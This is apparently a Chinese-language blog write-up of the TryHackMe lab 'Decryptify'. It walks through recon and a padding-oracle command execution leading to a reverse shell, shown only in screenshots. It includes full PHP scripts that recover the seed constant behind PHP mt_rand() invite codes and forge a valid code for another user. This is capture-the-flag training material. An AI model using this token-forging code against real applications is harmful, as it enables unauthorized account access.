---
title: '[thm] Decryptify'
date: 2025-04-08 10:30 +0800
categories: [hack,TryHackMe]
tags: []
---

## information

![alt text](<../assets/img/2025-04-08-[thm] Decryptify.assets/image.png>)
> port scan

![alt text](<../assets/img/2025-04-08-[thm] Decryptify.assets/image-1.png>)
可以看到是一个登录页面，使用邀请码登录

![alt text](<../assets/img/2025-04-08-[thm] Decryptify.assets/image-2.png>)
扫描可以发现日志信息，记录了两个用户名和一个邀请码

![alt text](<../assets/img/2025-04-08-[thm] Decryptify.assets/image-3.png>)
思路就是获得`hello@fake.thm`用户的邀请码
![alt text](<../assets/img/2025-04-08-[thm] Decryptify.assets/image-14.png>)
有一个api.php
![alt text](<../assets/img/2025-04-08-[thm] Decryptify.assets/image-4.png>)
继续扫描发现存在一个`api.js`
![alt text](<../assets/img/2025-04-08-[thm] Decryptify.assets/image-7.png>)
分析内容，是对一段密文的加密流程
![alt text](<../assets/img/2025-04-08-[thm] Decryptify.assets/image-5.png>)
放到console中，得到密文
![alt text](<../assets/img/2025-04-08-[thm] Decryptify.assets/image-6.png>)
成功登录，获得了生成邀请码的逻辑代码
这里涉及到一个php伪随机mt_rand()，思路就是通过已有的邀请码逆向，获得constant_value，再生成`hello@fake.thm`用户的邀请码。
```php
<?php
function calculate_seed_value($email, $constant_value)
{
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);
    return $seed_value;
}

function reverse_constant_value($email, $invite_code)
{
    // Step 1: Decode Base64 invite code
    $random_value = intval(base64_decode($invite_code));

    // Step 2: Get email components
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));

    // Step 3: Iterate over possible constant values
    for ($constant_value = 0; $constant_value <= 1000000; $constant_value++) {
        $seed_value = hexdec($email_length + $constant_value + $email_hex);

        mt_srand($seed_value);
        if (mt_rand() === $random_value) {
            return $constant_value;
        }
    }
    return "Constant value not found in range.";
}

// Given data
$email = "alpha@fake.thm";
$invite_code = "MTM0ODMzNzEyMg=="; // Base64 encoded value

// Reverse the constant value
$constant_value = reverse_constant_value($email, $invite_code);

echo "Reversed Constant Value: " . $constant_value . PHP_EOL;



```
生成新邀请码
```php
<?php

function calculate_seed_value($email, $constant_value)
{
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);

    return $seed_value;
}

function generate_token($email, $constant_value)
{
    $seed_value = calculate_seed_value($email, $constant_value);
    mt_srand($seed_value);
    $random = mt_rand();
    $invite_code = base64_encode($random);

    return $invite_code;
}


$email = "hello@fake.thm";
$token = generate_token($email, 99999);
print $token

    ?>
```

**hello@fake.thm:NDYxNTg5ODkx**

## user1

![alt text](<../assets/img/2025-04-08-[thm] Decryptify.assets/image-8.png>)

![alt text](<../assets/img/2025-04-08-[thm] Decryptify.assets/image-9.png>)
进入后是一个仪表盘页面，存在隐藏的表单信息。尝试填入空的值，会报错，错误信息标志着这里存在一个padding oracle vulnerability。中文我也不知道叫什么，类似于参数rce。

![alt text](<../assets/img/2025-04-08-[thm] Decryptify.assets/image-11.png>)

https://github.com/glebarez/padre
用这个项目生成payload

![alt text](<../assets/img/2025-04-08-[thm] Decryptify.assets/image-10.png>)
成功执行命令
![alt text](<../assets/img/2025-04-08-[thm] Decryptify.assets/image-12.png>)

## root

反弹shell
![alt text](<../assets/img/2025-04-08-[thm] Decryptify.assets/image-13.png>)

## conlusion
- 在扫描中，js代码也是不可忽略的一环
- 要增加一下php代码能力